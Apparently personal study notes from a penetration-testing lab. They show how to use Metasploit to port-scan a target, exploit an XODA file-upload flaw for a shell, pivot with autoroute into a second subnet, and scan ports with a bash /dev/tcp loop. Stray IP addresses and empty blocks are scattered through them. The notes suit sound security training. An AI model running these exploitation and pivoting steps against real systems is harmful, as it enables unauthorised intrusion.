
- Used to perform activity and functionality besides the exploitation of a vuln
- Used to extract information
- Can scan both UDP and TCP
- Can chain scans through a subnet or network infrastructure

#### Commands

Start postgresql and msfconsole
```
systemctl start postgresql && msfconsole
```

Check status of database
```
db_status
```

Create workspace and switch to workspace
```
workspace -a <name_workspace>
workspace <port_scan_workspace>
```

Search for portscan module in msfconsole and load module
```
search portscan
use auxiliary/scanner/portscan/tcp
options
set RHOSTS <target_ip_address>
exploit
```

Get target homepage details
```
curl <target_ip_address>
```

Search for xoda exploit
```
search xoda
use /exploit/unix/webapp/xoda_file_upload/ 
options
set RHOSTS <target_ip_address>
set TARGETURI / 
options
exploit
```

Switch to bin bash in meterpreter
```
/bin/bash -i
ifconfig

```
Crtl-Z

```
run autoroute -s <target_ip_address>
background
```

Enumerate subnet
```
search portscan
use 5 
Set RHOSTS <target_ip_address>
options
exploit
```


```

```

## Quiz

Which one of the following MSF auxiliary modules can be used to perform a TCP port scan?

	auxiliary/scanner/portscan/tcp

```
192.137.74.3
XODA
set TARGETUI / 

192.92.97.2/24
```
## Lab

[Network Service Scanning](https://attack.mitre.org/techniques/T1046/) is a part of the exploitation as well as the post-exploitation phase and deals with identifying the services running on remote hosts.

In this lab, we are given access to a Kali machine. There are two target machines, one of the target machines is present on the same network. This target machine is vulnerable and can be exploited using the following information. Use this information to get a shell on the target machine and complete the mission!

Vulnerability Information

- Vulnerability: XODA File Upload Vulnerability
- Metasploit module: exploit/unix/webapp/xoda_file_upload

Your mission:

- Identify the ports open on the second target machine using appropriate Metasploit modules.
- Write a bash script to scan the ports of the second target machine.
- Upload the nmap static binary to the target machine and identify the services running on the second target machine.

References:

- Network Service Scanning ([https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/))

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- **The static binaries are present in the directory "/root/tools/"**

192.116.28.2

References:

- Network Service Scanning ([https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/))

```

```

```
run autoroute -s 192.116.28.2
```

```
 192.130.44.2
```

```
#!/bin/bash
for port in {1..1000}; do
timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```